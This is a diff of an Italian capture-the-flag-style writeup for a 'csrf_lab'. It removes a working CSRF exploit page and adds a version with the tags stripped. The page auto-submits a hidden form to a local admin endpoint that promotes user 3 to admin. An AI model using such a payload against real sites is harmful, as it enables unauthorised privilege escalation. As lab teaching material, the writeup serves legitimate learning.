@@ -1,4 +1,4 @@
-# <img src="https://demolab.com" alt="csrf_lab" />
+#  Writeup Csrf_lab
 
 * Scanzione delle porte con `nmap`
 
@@ -130,26 +130,28 @@
 
 # ✴️ HINT guarda rilultati foothold.
 <p>
+* NOTE: o rimosso tutti i tag <> per far si che il code sia leggibile dalla home.
+
 ```bash 
-	<!DOCTYPE html>
-		<html lang="it">
-			<head>
-				<title>Sito Malevolo - CSRF Exploit</title>
-			</head>
-			<body>
-				<p>Caricamento in corso...</p>
+	DOCTYPE html
+		html lang="it"
+			head
+				title>Sito Malevolo - CSRF Exploit /title
+			/head
+			body
+				pCaricamento in corso.../p
 				<!-- Il form punta all'endpoint vulnerabile sul container web -->
-				<form id="csrfForm" action="http://127.0.0.1:8080/app_internal/admin.php" method="POST"> 
+				form id="csrfForm" action="http://127.0.0.1:8080/app_internal/admin.php" method="POST" 
 					<!-- ID dell'utente dell'attaccante da promuovere (es. ID 2 per analyst) -->
-					<input type="hidden" name="user_id" value="3">
-					<input type="hidden" name="new_role" value="admin">
-				</form>
-				<script>
+					input type="hidden" name="user_id" value="3"
+					input type="hidden" name="new_role" value="admin"
+				/form
+				script
 					// Esegue il submit automatico del form in background
 					document.getElementById('csrfForm').submit();
-				</script>
-			</body>
-		</html>
+				/script
+			/body
+		/html
 ```
 </p>
 </details>
